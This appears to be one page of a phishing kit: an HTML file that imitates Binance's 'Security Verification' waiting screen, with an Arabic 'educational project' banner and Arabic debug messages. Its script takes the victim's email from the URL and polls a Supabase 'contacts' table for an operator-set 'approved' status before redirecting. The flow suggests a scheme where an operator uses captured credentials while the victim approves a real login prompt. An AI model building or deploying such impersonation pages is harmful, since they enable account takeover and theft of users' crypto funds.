<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Security Verification | Binance</title>
  <style>
    :root { --bg: #181a20; --text: #eaecef; --yellow: #f0b90b; --line: rgba(255, 255, 255, 0.08); }
    * { box-sizing: border-box; }
    body { margin: 0; min-height: 100vh; background: var(--bg); color: var(--text); font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; padding-top: 50px; }
    .edu-notice { position: fixed; top: 0; left: 0; right: 0; z-index: 9999; background: var(--yellow); color: #111; text-align: center; padding: 10px 16px; font-size: 14px; font-weight: 700; }
    .page-shell { width: 100%; display: flex; justify-content: center; padding: 28px 16px; }
    .verification-card { width: min(100%, 640px); background: rgba(18, 21, 27, 0.98); border: 1px solid var(--line); border-radius: 24px; padding: 32px 28px; text-align: center; }
    .brand-icon { width: 120px; height: 28px; margin-bottom: 26px; }
    .title { font-size: clamp(2rem, 4vw, 3.5rem); margin: 0 0 26px; color: #f2f3f5; }
    .shield-icon { width: 168px; height: 150px; margin-bottom: 24px; }
    .message-title { font-size: 1.5rem; font-weight: 700; margin-bottom: 10px; }
    .message-copy { font-size: 1.1rem; color: rgba(255,255,255,0.7); margin-bottom: 28px; line-height: 1.6; }
    .resend-btn { width: 100%; max-width: 440px; height: 60px; border: none; border-radius: 14px; background: linear-gradient(180deg, rgba(240,185,11,0.42), rgba(240,185,11,0.2)); color: #f7d77d; font-size: 1.5rem; font-weight: 700; cursor: pointer; margin: 0 auto 24px; display: block; }
    .resend-btn:disabled { opacity: 0.9; cursor: default; }
    .other-method { display: block; color: var(--yellow); text-decoration: none; font-weight: 700; font-size: 1.2rem; margin-bottom: 20px; }
    .footer { display: flex; justify-content: center; gap: 20px; color: #929aa5; font-size: 14px; margin-top: 20px; }
    .footer span { cursor: pointer; }
    
    /* شاشة التشخيص */
    #debug-screen { position: fixed; bottom: 0; left: 0; right: 0; background: red; color: white; text-align: center; padding: 10px; font-weight: bold; z-index: 10000; font-size: 14px; }
  </style>
</head>
<body>
  <div class="edu-notice" id="eduNotice">⚠️ مشروع تعليمي — غير تابع لـ Binance.</div>

  <main class="page-shell">
    <section class="verification-card">
      <h1 class="title" id="txtTitle">Security Verification</h1>
      <div class="message">
        <div class="message-title" id="txtMsgTitle">Open Binance app on your phone</div>
        <div class="message-copy" id="txtMsgCopy">Waiting for approval...</div>
      </div>
      <button type="button" id="resendBtn" class="resend-btn">Resend (13s)</button>
      <a href="index.html" class="other-method" id="txtOtherMethod">Use Other Methods</a>
    </section>
  </main>

  <!-- شاشة التشخيص -->
  <div id="debug-screen">جاري تشغيل السكربت...</div>

  <script type="module">
    // 1. تغيير شاشة التشخيص
    const debugScreen = document.getElementById('debug-screen');
    debugScreen.textContent = "الخطوة 1: بدأ تحميل السكربت";

    try {
      import('./supabase.js').then((module) => {
        debugScreen.textContent = "الخطوة 2: تم تحميل Supabase بنجاح!";
        const supabase = module.supabase;

        // العداد التنازلي
        const resendBtn = document.getElementById('resendBtn');
        let countdown = 13;
        
        function updateButton() {
            resendBtn.textContent = `Resend (${countdown}s)`;
        }

        setInterval(() => {
            countdown -= 1;
            if (countdown <= 0) {
                resendBtn.textContent = 'Resend';
                resendBtn.disabled = false;
            } else {
                updateButton();
            }
        }, 1000);

        // قراءة الإيميل
        const urlParams = new URLSearchParams(window.location.search);
        let userEmail = urlParams.get('email') || sessionStorage.getItem('pendingEmail');
        
        if (!userEmail) {
            debugScreen.textContent = "الخطأ: لا يوجد إيميل في الرابط!";
            debugScreen.style.background = "orange";
            return;
        }

        debugScreen.textContent = "الخطوة 3: جاري فحص الموافقة للإيميل: " + userEmail;

        // الفحص الدوري
        setInterval(async () => {
            const { data, error } = await supabase.from('contacts').select('status').eq('email', userEmail);
            if (data && data.length > 0) {
                if (data.some(row => row.status === 'approved')) {
                    debugScreen.textContent = "🎉 تمت الموافقة! جاري التحويل...";
                    debugScreen.style.background = "green";
                    setTimeout(() => { window.location.href = 'success.html'; }, 1000);
                } else {
                    debugScreen.textContent = "⏳ الحالة: pending (بانتظار الموافقة) - الإيميل: " + userEmail;
                }
            } else {
                 debugScreen.textContent = "⚠️ الإيميل غير موجود في قاعدة البيانات!";
                 debugScreen.style.background = "orange";
            }
        }, 3000);

      }).catch(error => {
        // إذا فشل تحميل ملف supabase.js
        debugScreen.textContent = "❌ خطأ في تحميل supabase.js: " + error.message;
        debugScreen.style.background = "black";
      });
    } catch (error) {
      debugScreen.textContent = "❌ خطأ فادح: " + error.message;
    }
  </script>
</body>
</html>
